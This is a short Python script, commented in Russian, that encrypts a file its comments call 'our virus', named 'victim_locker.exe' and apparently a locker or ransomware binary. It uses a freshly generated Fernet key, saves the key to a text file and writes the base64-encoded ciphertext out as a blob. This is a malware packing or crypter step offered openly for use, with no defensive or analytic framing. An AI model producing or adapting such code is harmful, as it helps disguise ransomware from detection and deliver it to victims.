import os
import base64
from cryptography.fernet import Fernet

# Генерируем ключ
key = Fernet.generate_key()
cipher = Fernet(key)

# Читаем наш вирус
with open("victim_locker.exe", "rb") as f:
    data = f.read()

# Шифруем
encrypted = cipher.encrypt(data)

# Сохраняем ключ в файл (чтобы ты знал)
with open("key.txt", "wb") as f:
    f.write(key)

# Сохраняем зашифрованный файл
with open("encrypted.bin", "wb") as f:
    f.write(base64.b64encode(encrypted))
